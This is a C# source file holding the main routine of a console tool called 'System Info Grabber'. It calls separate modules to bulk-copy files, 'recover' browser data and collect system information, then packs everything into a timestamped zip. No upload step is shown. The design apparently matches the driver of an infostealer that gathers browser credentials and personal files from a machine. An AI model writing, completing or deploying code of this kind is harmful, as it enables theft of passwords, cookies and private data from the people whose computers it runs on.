using System;
using System.IO;
using System.IO.Compression;
using SystemInfoGrabber;

class Program
{
    static void Main()
    {
        Console.Title = "System Info Grabber";
        Console.WriteLine("System Info Grabber v1.0");
        Console.WriteLine("-----------------------");

        string zipPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"data_{DateTime.Now:yyyyMMdd_HHmmss}.zip");

        Console.Write("[*] Collecting files... ");
        bool filesOk = FileGrabber.GrabAllFiles(zipPath);
        Console.WriteLine(filesOk ? $"OK ({FileGrabber.TotalFilesCopied} files, {(FileGrabber.TotalBytesCopied / 1024.0 / 1024.0):F1} MB)" : "FAILED");

        Console.Write("[*] Recovering browser data... ");
        try
        {
            ConsoleApp1.BrowserRecovery.Execute(zipPath);
            Console.WriteLine("OK");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"FAILED: {ex.Message}");
        }

        Console.Write("[*] Getting system info... ");
        string sysInfo = SystemInfo.GetAll();
        Console.WriteLine("OK");

        Console.Write("[*] Creating archive... ");
        try
        {
            using (var zip = ZipFile.Open(zipPath, FileGrabber.TotalFilesCopied > 0 || File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
            {
                var entry = zip.CreateEntry("system_info.txt");
                using (var writer = new StreamWriter(entry.Open()))
                {
                    writer.Write(sysInfo);
                }
            }
            Console.WriteLine("OK");
        }
        catch
        {
            Console.WriteLine("FAILED");
        }

        Console.WriteLine($"-----------------------");
        Console.WriteLine($"[✓] Done: {Path.GetFileName(zipPath)}");
        Console.WriteLine($"[✓] Files: {FileGrabber.TotalFilesCopied} copied, {FileGrabber.TotalFilesSkipped} skipped");
    }
}
